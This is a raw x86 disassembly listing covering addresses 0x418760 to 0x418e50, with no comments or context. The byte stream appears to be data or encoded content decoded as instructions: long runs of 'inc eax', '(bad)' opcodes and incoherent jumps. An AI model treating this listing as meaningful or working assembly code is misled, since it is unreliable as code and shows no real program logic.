  418760:	adc    esp,esi
  418762:	inc    eax
  418763:	inc    eax
  418764:	inc    eax
  418765:	inc    eax
  418766:	inc    eax
  418767:	inc    eax
  418768:	inc    eax
  418769:	inc    eax
  41876a:	inc    eax
  41876b:	inc    eax
  41876c:	stos   BYTE PTR es:[edi],al
  41876d:	sbb    ebp,DWORD PTR [ecx*1-0xc7db330]
  418774:	jae    0x4187f4
  418776:	and    BYTE PTR [eax+0x49],cl
  418779:	cmp    eax,0xa80e6332
  41877e:	lds    esp,FWORD PTR [ecx+eiz*1-0x3d]
  418782:	jp     0x418759
  418784:	leave  
  418785:	adc    BYTE PTR [esi-0x2d],dl
  418788:	jl     0x4187f9
  41878a:	cmp    DWORD PTR [edi+0x40e2410b],0x40404040
  418794:	inc    eax
  418795:	inc    eax
  418796:	inc    eax
  418797:	add    BYTE PTR [eax+ebp*4],cl
  41879a:	dec    ebx
  41879b:	outs   dx,BYTE PTR ds:[esi]
  41879c:	sbb    al,0x40
  41879e:	push   eax
  41879f:	inc    esp
  4187a0:	bound  esi,QWORD PTR [ebx+0x46]
  4187a3:	movlps QWORD PTR [eax+0x4],xmm0
  4187a7:	inc    eax
  4187a8:	inc    eax
  4187a9:	inc    eax
  4187aa:	inc    eax
  4187ab:	inc    eax
  4187ac:	inc    eax
  4187ad:	and    eax,0x2c404040
  4187b2:	inc    ecx
  4187b3:	test   BYTE PTR [eax-0x32bfcdaf],0x1e
  4187ba:	dec    eax
  4187bb:	(bad)  
  4187bc:	jmp    0x4187bf
  4187be:	xchg   ebx,eax
  4187bf:	inc    esi
  4187c0:	push   ecx
  4187c1:	aad    0x69
  4187c3:	inc    eax
  4187c4:	test   al,0x71
  4187c6:	inc    esp
  4187c7:	les    eax,FWORD PTR [esi+0x4a]
  4187ca:	retf   
  4187cb:	push   eax
  4187cc:	adc    al,BYTE PTR [ecx]
  4187ce:	mov    cl,0x12
  4187d0:	ds out dx,al
  4187d2:	test   al,0x41
  4187d4:	xor    BYTE PTR [eax+0x40],al
  4187d7:	inc    eax
  4187d8:	inc    eax
  4187d9:	inc    eax
  4187da:	inc    eax
  4187db:	inc    eax
  4187dc:	inc    eax
  4187dd:	inc    eax
  4187de:	inc    eax
  4187df:	das    
  4187e0:	inc    edx
  4187e1:	inc    eax
  4187e2:	push   esp
  4187e3:	inc    esp
  4187e4:	adc    al,BYTE PTR [eax-0x2d]
  4187e7:	and    BYTE PTR [edx],dh
  4187e9:	adc    eax,0x284c2c62
  4187ee:	push   edx
  4187ef:	inc    eax
  4187f0:	inc    eax
  4187f1:	inc    eax
  4187f2:	inc    eax
  4187f3:	inc    eax
  4187f4:	inc    eax
  4187f5:	rol    DWORD PTR [eax+0x40],0x83
  4187f9:	xor    eax,DWORD PTR [ecx+0x7d]
  4187fc:	sbb    al,0x41
  4187fe:	adc    BYTE PTR [eax],ch
  418800:	jb     0x418850
  418802:	iret   
  418803:	sub    ch,cl
  418805:	and    BYTE PTR [eax+0x471185cd],cl
  41880b:	arpl   WORD PTR [edx-0x6c],ax
  41880e:	inc    esp
  41880f:	push   ebx
  418810:	and    eax,0xfed06069
  418815:	push   edx
  418816:	adc    DWORD PTR [eax+0x40],eax
  418819:	add    BYTE PTR [eax+0x40],al
  41881c:	inc    eax
  41881d:	inc    eax
  41881e:	inc    eax
  41881f:	inc    eax
  418820:	inc    eax
  418821:	mov    ecx,esi
  418823:	inc    eax
  418824:	xor    al,0x44
  418826:	adc    esp,ecx
  418828:	imul   BYTE PTR [eax+eax*2]
  41882b:	inc    eax
  41882c:	mov    eax,ds:0x6c78b42c
  418831:	xor    DWORD PTR [ecx+0x6a1a175a],0x404040b4
  41883b:	inc    eax
  41883c:	inc    eax
  41883d:	inc    eax
  41883e:	inc    eax
  41883f:	inc    eax
  418840:	inc    eax
  418841:	inc    eax
  418842:	test   edi,0xc5c9ceb7
  418848:	ret    0xa828
  41884b:	add    DWORD PTR [esi+0x5a],ebx
  41884e:	push   0xfd846454
  418853:	dec    edx
  418854:	xor    DWORD PTR [eax+0x48],eax
  418857:	(bad)  
  418858:	ins    DWORD PTR es:[edi],dx
  418859:	bound  eax,QWORD PTR [eax+0x1]
  41885c:	imul   ecx,DWORD PTR ds:0x40404040,0x40
  418863:	inc    eax
  418864:	int3   
  418865:	jne    0x4188a7
  418867:	pop    ss
  418868:	inc    esp
  418869:	jo     0x4188dd
  41886b:	loop   0x4188b6
  41886d:	adc    eax,0x622cc940
  418872:	fsub   DWORD PTR [edi+0x6314d880]
  418878:	sbb    BYTE PTR [edi+0x62],al
  41887b:	sub    BYTE PTR [ecx],al
  41887d:	aaa    
  41887e:	inc    eax
  41887f:	dec    esp
  418880:	aad    0x5c
  418882:	dec    edi
  418883:	imul   edi,DWORD PTR [esi+0x40088b],0xffffffc1
  41888a:	inc    eax
  41888b:	inc    eax
  41888c:	inc    eax
  41888d:	inc    eax
  41888e:	add    BYTE PTR [eax-0x3e],al
  418891:	push   esp
  418892:	push   esp
  418893:	and    al,0x35
  418895:	iret   
  418896:	adc    eax,DWORD PTR [ebx+0x35]
  418899:	repnz cs dec bx
  41889d:	add    edx,DWORD PTR [ebp+0x40]
  4188a0:	arpl   WORD PTR [esp+ebp*4-0x24],ax
  4188a4:	dec    esp
  4188a5:	jl     0x4188f8
  4188a7:	cld    
  4188a8:	push   edx
  4188a9:	sub    al,0x66
  4188ab:	daa    
  4188ac:	cmp    eax,0x40406c87
  4188b1:	inc    eax
  4188b2:	inc    eax
  4188b3:	inc    eax
  4188b4:	inc    eax
  4188b5:	inc    eax
  4188b6:	inc    eax
  4188b7:	inc    DWORD PTR [eax+0x4c]
  4188ba:	xor    DWORD PTR [esi],edx
  4188bc:	mov    BYTE PTR [eax+0x607340c3],bl
  4188c2:	ror    ebp,1
  4188c4:	or     al,0x62
  4188c6:	and    BYTE PTR [eax],al
  4188c8:	pop    esp
  4188c9:	sbb    BYTE PTR [edx+0x47],ah
  4188cc:	push   ebx
  4188cd:	and    al,0xab
  4188cf:	and    edx,DWORD PTR [ecx]
  4188d1:	inc    eax
  4188d2:	add    dh,ch
  4188d4:	mov    dl,0x30
  4188d6:	dec    esp
  4188d7:	inc    edx
  4188d8:	es adc al,0x56
  4188db:	inc    eax
  4188dc:	inc    eax
  4188dd:	inc    eax
  4188de:	inc    eax
  4188df:	inc    eax
  4188e0:	inc    eax
  4188e1:	inc    eax
  4188e2:	inc    eax
  4188e3:	inc    eax
  4188e4:	inc    eax
  4188e5:	inc    esp
  4188e6:	test   al,0x7c
  4188e8:	pop    edi
  4188e9:	add    BYTE PTR [ebp+0x302ce740],dh
  4188ef:	sub    al,0xc8
  4188f1:	xor    edi,DWORD PTR [edi+0x4040dc6e]
  4188f7:	inc    eax
  4188f8:	inc    eax
  4188f9:	inc    eax
  4188fa:	inc    eax
  4188fb:	inc    eax
  4188fc:	inc    eax
  4188fd:	add    BYTE PTR [esi+ebp*8],dl
  418900:	mov    al,0x34
  418902:	push   esp
  418903:	inc    esp
  418904:	inc    eax
  418905:	out    dx,al
  418906:	lds    esp,FWORD PTR [edx+0x5]
  418909:	pushf  
  41890a:	add    eax,0x41d00e11
  41890f:	xchg   edx,eax
  418910:	xchg   DWORD PTR [eax-0x57bfe4b0],ebp
  418916:	inc    eax
  418917:	inc    eax
  418918:	inc    eax
  418919:	inc    eax
  41891a:	inc    eax
  41891b:	inc    eax
  41891c:	and    eax,0xee404040
  418921:	xor    al,0x25
  418923:	adc    BYTE PTR [ebx+0x44050f31],al
  418929:	(bad)
  41892c:	stos   DWORD PTR es:[edi],eax
  41892d:	pop    eax
  41892e:	inc    eax
  41892f:	retf   
  418930:	sub    al,0x4f
  418932:	jne    0x418939
  418934:	imul   edx,DWORD PTR [ebx+0x9],0xfc8012c7
  41893b:	inc    ebx
  41893c:	add    DWORD PTR [eax+0x40],ebx
  41893f:	iret   
  418940:	push   ebx
  418941:	inc    eax
  418942:	inc    eax
  418943:	inc    eax
  418944:	inc    eax
  418945:	inc    eax
  418946:	inc    eax
  418947:	inc    eax
  418948:	inc    eax
  418949:	inc    eax
  41894a:	inc    eax
  41894b:	inc    eax
  41894c:	dec    ecx
  41894d:	js     0x4189af
  41894f:	mov    ah,0x14
  418951:	add    DWORD PTR gs:[eax+0x20],0x4033593c
  418959:	xor    BYTE PTR [ebx+eiz*2-0x3b],al
  41895d:	inc    ebx
  41895e:	pushaw 
  418960:	add    edx,DWORD PTR [esp+ebp*1]
  418963:	inc    eax
  418964:	inc    eax
  418965:	inc    eax
  418966:	inc    eax
  418967:	inc    eax
  418968:	inc    eax
  418969:	rol    DWORD PTR [eax+0x40],0x7d
  41896d:	inc    esi
  41896e:	test   al,0x1
  418970:	rol    DWORD PTR [eax+0x52],1
  418973:	adc    BYTE PTR [ebp+edi*8+0x6d],al
  418977:	rcl    BYTE PTR [edx+0x15],1
  41897a:	lods   al,BYTE PTR ds:[esi]
  41897b:	int    0x54
  41897d:	dec    edi
  41897e:	mov    ch,0x8c
  418980:	mov    bl,0x40
  418982:	or     eax,0x40607c4b
  418987:	inc    eax
  418988:	add    BYTE PTR [eax+0x40],al
  41898b:	inc    eax
  41898c:	inc    eax
  41898d:	inc    eax
  41898e:	inc    eax
  41898f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418990:	outs   dx,BYTE PTR ds:[esi]
  418991:	fst    DWORD PTR [edx]
  418993:	retf   
  418994:	out    0x68,al
  418996:	jnp    0x418940
  418998:	pop    esp
  418999:	mov    ch,0x41
  41899b:	jae    0x4189e1
  41899d:	aaa    
  41899e:	pusha  
  41899f:	lmsw   WORD PTR [edi-0x71d320c0]
  4189a6:	arpl   WORD PTR [eax+eax*2+0x40404040],si
  4189ad:	inc    eax
  4189ae:	inc    eax
  4189af:	inc    eax
  4189b0:	inc    eax
  4189b1:	inc    eax
  4189b2:	jnp    0x4189b7
  4189b4:	inc    ebx
  4189b5:	dec    esp
  4189b6:	push   cs
  4189b7:	test   al,0x4d
  4189b9:	xor    eax,DWORD PTR [ecx]
  4189bb:	aas    
  4189bc:	les    edx,FWORD PTR [ecx]
  4189be:	lds    ebp,FWORD PTR [ebp+0x46]
  4189c1:	cmp    bl,bl
  4189c3:	add    ecx,DWORD PTR [esi]
  4189c5:	inc    esp
  4189c6:	push   esp
  4189c7:	xchg   edi,eax
  4189c8:	std    
  4189c9:	sub    BYTE PTR ds:0xf22a403f,ah
  4189cf:	bound  ebp,QWORD PTR [ebx+0x68]
  4189d2:	add    DWORD PTR [eax+0x40],0x40404040
  4189d9:	int3   
  4189da:	jne    0x418a1c
  4189dc:	add    ecx,DWORD PTR [ecx]
  4189de:	jo     0x418a2e
  4189e0:	inc    ecx
  4189e1:	addr16 xor eax,0x2403f4b
  4189e7:	xor    BYTE PTR [edi],dl
  4189e9:	test   al,0x4a
  4189eb:	add    BYTE PTR [ebx],0x1f
  4189ee:	leave  
  4189ef:	or     al,0xc9
  4189f1:	bound  ecx,QWORD PTR [eax+0x29]
  4189f4:	aas    
  4189f5:	inc    edx
  4189f6:	mov    al,0x40
  4189f8:	add    cl,al
  4189fa:	inc    eax
  4189fb:	inc    eax
  4189fc:	inc    eax
  4189fd:	inc    eax
  4189fe:	add    BYTE PTR [eax-0x2b],al
  418a01:	mov    ebp,0x485246fb
  418a06:	inc    eax
  418a07:	inc    ecx
  418a08:	dec    ebp
  418a09:	and    BYTE PTR [esi+0x1cdf81ec],cl
  418a0f:	inc    esp
  418a10:	loop   0x418a36
  418a12:	jne    0x4189e2
  418a14:	sbb    cl,BYTE PTR [ecx+0x68]
  418a17:	enter  0x4040,0x40
  418a1b:	inc    eax
  418a1c:	inc    eax
  418a1d:	inc    eax
  418a1e:	inc    eax
  418a1f:	inc    eax
  418a20:	inc    DWORD PTR [eax+0x4e]
  418a23:	test   BYTE PTR [esi+0x405f0146],bl
  418a29:	je     0x418a5b
  418a2b:	inc    eax
  418a2c:	add    eax,0x503798d
  418a31:	or     BYTE PTR [edx],cl
  418a33:	adc    ch,cl
  418a35:	dec    ebp
  418a36:	(bad)  
  418a38:	inc    eax
  418a39:	leave  
  418a3a:	int    0x5a
  418a3c:	imul   ebp,DWORD PTR [eax+0x40404040],0x40404040
  418a46:	inc    eax
  418a47:	inc    eax
  418a48:	pop    edx
  418a49:	dec    edx
  418a4a:	add    al,0xbc
  418a4c:	inc    ecx
  418a4d:	les    esp,FWORD PTR [esi]
  418a4f:	adc    DWORD PTR [ebx],eax
  418a51:	mov    cl,0x41
  418a53:	inc    ecx
  418a54:	add    cl,BYTE PTR [edi-0x54]
  418a57:	ret    0xbf45
  418a5a:	xor    al,0x45
  418a5c:	push   0x2b9043
  418a61:	int3   
  418a62:	mov    al,cl
  418a64:	or     BYTE PTR [esi],bh
  418a66:	bound  eax,QWORD PTR [eax+0x40]
  418a69:	inc    eax
  418a6a:	inc    eax
  418a6b:	inc    eax
  418a6c:	inc    eax
  418a6d:	inc    eax
  418a6e:	inc    eax
  418a6f:	add    BYTE PTR [edx-0x61],dl
  418a72:	mov    dl,0x62
  418a74:	push   edx
  418a75:	lds    edi,FWORD PTR [ecx+ebp*4]
  418a78:	xchg   esp,eax
  418a79:	and    DWORD PTR [eax],ebp
  418a7b:	inc    eax
  418a7c:	fs fcmove st,st(0)
  418a7f:	mov    ah,0x40
  418a81:	pop    esp
  418a82:	bound  edx,QWORD PTR [ebx]
  418a84:	fstp   QWORD PTR [esi+0x40404040]
  418a8a:	inc    eax
  418a8b:	inc    eax
  418a8c:	and    eax,0x55404040
  418a91:	js     0x418a13
  418a93:	add    DWORD PTR [edx],ebx
  418a95:	inc    eax
  418a96:	pop    eax
  418a97:	into   
  418a98:	dec    esp
  418a99:	sub    BYTE PTR [ecx+edx*1+0x27],0x9
  418a9e:	stos   DWORD PTR es:[edi],eax
  418a9f:	adc    eax,0x83595405
  418aa4:	fadd   DWORD PTR [eax+0x68]
  418aa7:	leave  
  418aa8:	leave  
  418aa9:	sbb    ch,BYTE PTR [eax+0x110c1374]
  418aaf:	es dec esp
  418ab1:	or     al,0x40
  418ab3:	inc    eax
  418ab4:	inc    eax
  418ab5:	inc    eax
  418ab6:	inc    eax
  418ab7:	inc    eax
  418ab8:	inc    eax
  418ab9:	inc    eax
  418aba:	inc    eax
  418abb:	inc    eax
  418abc:	pusha  
  418abd:	xor    DWORD PTR [eax],0x8492c940
  418ac3:	bound  ebp,QWORD PTR [ebx+ebx*2+0x73b01499]
  418aca:	inc    edx
  418acb:	dec    ecx
  418acc:	ins    BYTE PTR es:[edi],dx
  418acd:	add    eax,DWORD PTR [edx]
  418acf:	inc    eax
  418ad0:	inc    ebx
  418ad1:	int3   
  418ad2:	arpl   WORD PTR [edx+edi*2],di
  418ad5:	data16 lahf 
  418ad7:	adc    BYTE PTR [ebp+ecx*1+0xc],al
  418adb:	inc    eax
  418adc:	inc    eax
  418add:	inc    eax
  418ade:	inc    eax
  418adf:	inc    eax
  418ae0:	inc    eax
  418ae1:	rol    DWORD PTR [eax+0x40],0x66
  418ae5:	sub    BYTE PTR [ebp+0x45c84002],al
  418aeb:	bound  edx,QWORD PTR [esi+ebp*2+0x6c199ff5]
  418af2:	inc    esp
  418af3:	pop    edi
  418af4:	and    BYTE PTR [eax+0x40],al
  418af7:	add    BYTE PTR [eax+0x40],al
  418afa:	inc    eax
  418afb:	inc    eax
  418afc:	inc    eax
  418afd:	inc    eax
  418afe:	xor    eax,0x240efc2
  418b03:	in     al,dx
  418b04:	test   al,0xa9
  418b06:	dec    ecx
  418b07:	sub    eax,0xf9c91241
  418b0c:	inc    eax
  418b0d:	inc    eax
  418b0e:	inc    eax
  418b0f:	inc    eax
  418b10:	inc    eax
  418b11:	inc    eax
  418b12:	inc    eax
  418b13:	inc    eax
  418b14:	inc    eax
  418b15:	inc    eax
  418b16:	inc    eax
  418b17:	std    
  418b18:	inc    edi
  418b19:	inc    DWORD PTR ds:[eax-0x44]
  418b1d:	retf   0x7f2a
  418b20:	inc    esi
  418b21:	add    BYTE PTR [edx],al
  418b23:	add    eax,DWORD PTR ds:0xe09841d4
  418b29:	rcr    DWORD PTR [edi+0x3cb2424d],0xd
  418b30:	sub    BYTE PTR [esi+0x7a],0x39
  418b34:	push   ebx
  418b35:	enter  0xf424,0x46
  418b39:	ret    0x881f
  418b3c:	cmp    BYTE PTR [eax+0x40],al
  418b3f:	inc    eax
  418b40:	inc    eax
  418b41:	inc    eax
  418b42:	inc    eax
  418b43:	int3   
  418b44:	jne    0x418b86
  418b46:	adc    eax,0x3081ab48
  418b4b:	add    ah,BYTE PTR [edx+0x54]
  418b4e:	xor    DWORD PTR [edx],ebp
  418b50:	test   al,0x1
  418b52:	mov    al,0x9f
  418b54:	aaa    
  418b55:	inc    eax
  418b56:	add    cl,al
  418b58:	inc    eax
  418b59:	inc    eax
  418b5a:	inc    eax
  418b5b:	inc    eax
  418b5c:	add    BYTE PTR [eax+0x64],al
  418b5f:	repnz pop edx
  418b61:	push   esi
  418b62:	test   al,0xc1
  418b64:	imul   ebp,eax,0xffffffd1
  418b67:	cli    
  418b68:	xor    eax,0x1dc0122e
  418b6d:	bound  eax,QWORD PTR [eax+0x40]
  418b70:	inc    eax
  418b71:	inc    eax
  418b72:	inc    eax
  418b73:	inc    eax
  418b74:	inc    eax
  418b75:	inc    eax
  418b76:	inc    DWORD PTR [eax+0x72]
  418b79:	mov    BYTE PTR [ecx-0x48],0x94
  418b7d:	shr    DWORD PTR [ebx+0x36],0xab
  418b81:	or     eax,0x48417750
  418b86:	pop    ds
  418b87:	pop    eax
  418b88:	pusha  
  418b89:	dec    ecx
  418b8a:	and    al,0x45
  418b8c:	push   edx
  418b8d:	ret    
  418b8e:	imul   esp,DWORD PTR [edx+0x8],0x40
  418b92:	inc    eax
  418b93:	inc    eax
  418b94:	inc    eax
  418b95:	inc    eax
  418b96:	inc    eax
  418b97:	inc    eax
  418b98:	inc    eax
  418b99:	inc    eax
  418b9a:	inc    eax
  418b9b:	jmp    0x418b58
  418b9d:	push   edx
  418b9e:	aam    0x13
  418ba0:	pop    ds
  418ba1:	aaa    
  418ba2:	leave  
  418ba3:	stc    
  418ba4:	cwde   
  418ba5:	sbb    al,BYTE PTR [eax-0x3e]
  418ba8:	or     al,0xf8
  418baa:	mov    al,0xc4
  418bac:	mov    ecx,0x402c80e0
  418bb1:	inc    eax
  418bb2:	inc    eax
  418bb3:	inc    eax
  418bb4:	inc    eax
  418bb5:	inc    eax
  418bb6:	inc    eax
  418bb7:	inc    eax
  418bb8:	add    BYTE PTR [edx+eiz*2+0x63e8050d],dh
  418bbf:	outs   dx,BYTE PTR ds:[esi]
  418bc0:	sahf   
  418bc1:	mov    edi,0x52554440
  418bc6:	mov    edx,0x7da1620a
  418bcb:	dec    ebp
  418bcc:	retf   
  418bcd:	test   eax,0x69c3a820
  418bd2:	or     eax,0x3eb00c24
  418bd7:	mov    al,ds:0x40404040
  418bdc:	inc    eax
  418bdd:	inc    eax
  418bde:	and    eax,0x5f404040
  418be3:	mov    bl,0x62
  418be5:	fs clc 
  418be7:	ret    
  418be8:	shr    BYTE PTR [ecx],0xc1
  418beb:	push   ebp
  418bec:	inc    eax
  418bed:	adc    edx,eax
  418bef:	jle    0x418c31
  418bf1:	inc    eax
  418bf2:	inc    eax
  418bf3:	inc    eax
  418bf4:	inc    eax
  418bf5:	inc    eax
  418bf6:	inc    eax
  418bf7:	inc    eax
  418bf8:	inc    eax
  418bf9:	inc    eax
  418bfa:	xor    al,0xe0
  418bfc:	push   es
  418bfd:	aaa    
  418bfe:	inc    eax
  418bff:	leave  
  418c00:	adc    eax,0xc1e10363
  418c05:	ins    BYTE PTR es:[edi],dx
  418c06:	inc    ebx
  418c07:	mov    esp,0x28d15041
  418c0c:	pop    ds
  418c0d:	pop    ecx
  418c0e:	push   0x5d0f5e15
  418c13:	imul   eax,ecx,0x62
  418c16:	add    DWORD PTR [edx-0xc],0xffffffc9
  418c1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c1b:	inc    eax
  418c1c:	inc    eax
  418c1d:	inc    eax
  418c1e:	inc    eax
  418c1f:	inc    eax
  418c20:	inc    eax
  418c21:	rol    DWORD PTR [eax+0x40],0x35
  418c25:	dec    ebp
  418c26:	push   ecx
  418c27:	arpl   WORD PTR [ebx-0x6],bx
  418c2a:	bound  ebp,QWORD PTR [ecx+0x48]
  418c2d:	(bad)  
  418c2e:	lds    esi,FWORD PTR [ebx+0x7366c028]
  418c34:	inc    edi
  418c35:	test   al,0xbd
  418c37:	inc    eax
  418c38:	inc    eax
  418c39:	add    BYTE PTR [eax+0x40],al
  418c3c:	inc    eax
  418c3d:	inc    eax
  418c3e:	inc    eax
  418c3f:	inc    eax
  418c40:	xchg   ebx,eax
  418c41:	push   esp
  418c42:	or     eax,0xf65fabbc
  418c47:	bound  esi,QWORD PTR [ebp+esi*1+0x40b8634e]
  418c4e:	inc    eax
  418c4f:	inc    eax
  418c50:	inc    eax
  418c51:	inc    eax
  418c52:	inc    eax
  418c53:	inc    eax
  418c54:	inc    eax
  418c55:	inc    eax
  418c56:	inc    eax
  418c57:	enter  0x15c1,0x4c
  418c5b:	inc    ecx
  418c5c:	repz xor eax,0x5d6340d3
  418c62:	dec    ebp
  418c63:	dec    eax
  418c64:	inc    esp
  418c65:	imul   ebp,DWORD PTR [edi],0x7fd3c1b3
  418c6b:	cmp    eax,0x46623d2c
  418c70:	mov    ebx,0x3ec3833f
  418c75:	mov    BYTE PTR [esi-0x7e],dh
  418c78:	xlat   BYTE PTR ds:[ebx]
  418c79:	pop    esp
  418c7a:	inc    eax
  418c7b:	inc    ebx
  418c7c:	lds    eax,FWORD PTR [eax+0x40]
  418c7f:	inc    eax
  418c80:	inc    eax
  418c81:	inc    eax
  418c82:	inc    eax
  418c83:	int3   
  418c84:	jne    0x418cc6
  418c86:	cwde   
  418c87:	cmp    BYTE PTR [edx],dh
  418c89:	ret    0x9e19
  418c8c:	dec    eax
  418c8d:	inc    edi
  418c8e:	pusha  
  418c8f:	jno    0x418c39
  418c91:	cs push edx
  418c93:	mov    esi,0xfc53ee88
  418c98:	adc    BYTE PTR [ecx-0x29],dh
  418c9b:	mov    es,WORD PTR [edx+0x44]
  418c9e:	frstor [esi+0x40]
  418ca1:	add    cl,al
  418ca3:	inc    eax
  418ca4:	inc    eax
  418ca5:	inc    eax
  418ca6:	inc    eax
  418ca7:	add    BYTE PTR [eax-0x34],al
  418caa:	rcl    DWORD PTR [edx+0x4c],0x3c
  418cae:	sub    al,0x65
  418cb0:	jne    0x418cf3
  418cb2:	(bad)  
  418cb3:	fbstp  TBYTE PTR [eax]
  418cb5:	lds    edi,FWORD PTR [eax+ecx*1]
  418cb8:	fcom   QWORD PTR [edx-0x3b]
  418cbb:	gs sahf 
  418cbd:	test   al,0xd5
  418cbf:	outs   dx,BYTE PTR ds:[esi]
  418cc0:	inc    eax
  418cc1:	xchg   esp,eax
  418cc2:	pop    ecx
  418cc3:	mov    bh,0x40
  418cc5:	inc    eax
  418cc6:	inc    eax
  418cc7:	inc    eax
  418cc8:	inc    eax
  418cc9:	inc    eax
  418cca:	inc    eax
  418ccb:	inc    eax
  418ccc:	inc    DWORD PTR [eax-0x42]
  418ccf:	adc    al,BYTE PTR [ecx+0xd]
  418cd2:	nop
  418cd3:	inc    eax
  418cd4:	(bad)  
  418cd5:	or     ecx,DWORD PTR [esp+edi*4-0x12]
  418cd9:	lods   al,BYTE PTR ds:[esi]
  418cda:	imul   ecx,DWORD PTR [ecx+ecx*1+0x44414131],0x62
  418ce2:	rol    BYTE PTR [eax+0x40],0x40
  418ce6:	inc    eax
  418ce7:	inc    eax
  418ce8:	inc    eax
  418ce9:	inc    eax
  418cea:	inc    eax
  418ceb:	inc    eax
  418cec:	inc    eax
  418ced:	ins    BYTE PTR es:[edi],dx
  418cee:	rcr    ebp,0x3c
  418cf1:	ins    DWORD PTR es:[edi],dx
  418cf2:	sub    al,0x44
  418cf4:	or     bh,BYTE PTR [ebx]
  418cf6:	dec    eax
  418cf7:	jno    0x418d5d
  418cf9:	lods   al,BYTE PTR ds:[esi]
  418cfa:	cmp    ah,BYTE PTR [eax]
  418cfc:	int3   
  418cfd:	test   al,0xc3
  418cff:	push   ebp
  418d00:	pop    esp
  418d01:	(bad)  
  418d02:	int    0x15
  418d04:	add    eax,0x5a15285d
  418d09:	dec    eax
  418d0a:	pop    ebp
  418d0b:	inc    eax
  418d0c:	inc    eax
  418d0d:	inc    eax
  418d0e:	inc    eax
  418d0f:	inc    eax
  418d10:	inc    eax
  418d11:	inc    eax
  418d12:	inc    eax
  418d13:	add    BYTE PTR [eax+0x53c105cb],ch
  418d19:	inc    eax
  418d1a:	call   0xd3d19e11
  418d1f:	(bad)  
  418d20:	inc    DWORD PTR [eax+0x45]
  418d23:	inc    esp
  418d24:	inc    eax
  418d25:	inc    eax
  418d26:	inc    eax
  418d27:	inc    eax
  418d28:	inc    eax
  418d29:	inc    eax
  418d2a:	and    eax,0x4c404040
  418d2f:	mov    edi,0x40bf44e2
  418d34:	enter  0x412c,0x68
  418d38:	sub    al,al
  418d3a:	pop    edi
  418d3b:	push   esp
  418d3c:	sar    BYTE PTR [eax],1
  418d3e:	jge    0x418d40
  418d40:	imul   esi,DWORD PTR [esi],0x73
  418d43:	inc    eax
  418d44:	inc    edx
  418d45:	(bad)
  418d48:	xor    eax,0x40404011
  418d4d:	inc    eax
  418d4e:	inc    eax
  418d4f:	inc    eax
  418d50:	inc    eax
  418d51:	inc    eax
  418d52:	inc    eax
  418d53:	inc    eax
  418d54:	dec    edi
  418d55:	inc    eax
  418d56:	xor    eax,0x4742634a
  418d5b:	sar    DWORD PTR [ebp-0x4b1d22c0],0x3c
  418d62:	inc    edi
  418d63:	push   ecx
  418d64:	inc    eax
  418d65:	push   eax
  418d66:	cmp    eax,0x46284244
  418d6b:	rcl    DWORD PTR [ecx],0x45
  418d6e:	inc    eax
  418d6f:	inc    eax
  418d70:	inc    eax
  418d71:	inc    eax
  418d72:	inc    eax
  418d73:	inc    eax
  418d74:	rol    DWORD PTR [eax+0x40],0x39
  418d78:	sub    al,0x45
  418d7a:	test   al,0xec
  418d7c:	and    eax,0x36659639
  418d81:	push   edx
  418d82:	adc    ah,BYTE PTR [ecx+eax*8+0x57]
  418d86:	mov    BYTE PTR [eax],dh
  418d88:	pop    edi
  418d89:	xor    bl,BYTE PTR [eax+0x46]
  418d8c:	inc    eax
  418d8d:	dec    ebx
  418d8e:	bound  esi,QWORD PTR [eax]
  418d90:	add    DWORD PTR [eax+edx*1+0x693c08d],0xcb624428
  418d9b:	jecxz  0x418dc4
  418d9d:	cmovo  eax,DWORD PTR [eax+0x0]
  418da1:	inc    eax
  418da2:	inc    eax
  418da3:	inc    eax
  418da4:	inc    eax
  418da5:	inc    eax
  418da6:	inc    eax
  418da7:	hlt    
  418da8:	inc    eax
  418da9:	sub    al,0x46
  418dab:	inc    eax
  418dac:	test   al,0xf
  418dae:	mul    BYTE PTR [edx+0x13]
  418db1:	xor    al,0x51
  418db3:	inc    eax
  418db4:	adc    ecx,eax
  418db6:	push   ecx
  418db7:	outs   dx,DWORD PTR ds:[esi]
  418db8:	imul   ecx,ebp,0xfdd5c6c1
  418dbe:	inc    DWORD PTR [ebx+esi*8+0x3be18d57]
  418dc5:	fs push ecx
  418dc7:	inc    eax
  418dc8:	inc    eax
  418dc9:	inc    eax
  418dca:	inc    eax
  418dcb:	inc    eax
  418dcc:	inc    eax
  418dcd:	inc    eax
  418dce:	inc    eax
  418dcf:	inc    eax
  418dd0:	inc    eax
  418dd1:	push   edx
  418dd2:	test   al,0xf2
  418dd4:	fs test al,0xcd
  418dd7:	ret    0x40ff
  418dda:	adc    cl,BYTE PTR [eax+0x62]
  418ddd:	inc    eax
  418dde:	int    0x2f
  418de0:	mov    edi,0xc830bc40
  418de5:	sub    ch,BYTE PTR [ecx+0x4a]
  418de8:	xor    al,0x60
  418dea:	inc    ecx
  418deb:	xor    dl,BYTE PTR [eax+0x11]
  418dee:	es ret 0x3e57
  418df2:	pusha  
  418df3:	inc    eax
  418df4:	xor    eax,0x40404040
  418df9:	inc    eax
  418dfa:	inc    eax
  418dfb:	int3   
  418dfc:	jne    0x418e3e
  418dfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dff:	push   ebx
  418e00:	sub    al,0x92
  418e02:	jl     0x418db4
  418e04:	shl    DWORD PTR [esi],0x4c
  418e07:	inc    eax
  418e08:	push   esp
  418e09:	xor    ah,BYTE PTR [eax+0x64]
  418e0c:	imul   edx,DWORD PTR [eax+0x40],0x4040c100
  418e13:	inc    eax
  418e14:	inc    eax
  418e15:	add    BYTE PTR [eax+0x7c],al
  418e18:	add    ecx,0x3090375d
  418e1e:	aad    0x14
  418e20:	ins    BYTE PTR es:[edi],dx
  418e21:	fbstp  TBYTE PTR [ebp*2+0x62035f2a]
  418e28:	out    dx,eax
  418e29:	ret    
  418e2a:	or     DWORD PTR [eax],edi
  418e2c:	rol    DWORD PTR [ecx+0x40a84020],0x40
  418e33:	inc    eax
  418e34:	inc    eax
  418e35:	inc    eax
  418e36:	inc    eax
  418e37:	inc    eax
  418e38:	inc    eax
  418e39:	inc    DWORD PTR [eax+0x4a]
  418e3c:	pop    ebx
  418e3d:	outs   dx,DWORD PTR ds:[esi]
  418e3e:	rol    BYTE PTR [eax+edx*2+0x46],0x87
  418e43:	shl    DWORD PTR [ecx],0x2e
  418e46:	inc    edx
  418e47:	and    BYTE PTR [eax+eax*2],cl
  418e4a:	inc    eax
  418e4b:	inc    eax
  418e4c:	inc    eax
  418e4d:	inc    eax
  418e4e:	inc    eax
  418e4f:	inc    eax
  418e50:	inc    eax
